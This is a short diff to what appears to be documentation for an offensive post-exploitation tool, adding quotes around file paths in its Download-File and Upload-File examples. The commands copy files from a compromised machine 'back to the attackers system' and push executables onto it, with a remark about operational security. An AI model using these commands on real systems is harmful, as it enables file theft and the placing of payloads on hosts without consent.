@@ -6,13 +6,13 @@
 
 Simply enter the path and name of the file to download, (copy back to the attackers system).
 
-`Download-File -Source C:\Temp\Run.exe`
+`Download-File -Source 'C:\Temp\Run Me.exe'`
 
 ### Upload-File
 
 Opposite of the above command
 
-`Upload-File -Source C:\Temp\Run.exe -Destination C:\Temp\Test.exe`
+`Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'`
 
 This is not considered the be Opsec safe for obvious reasons.
 
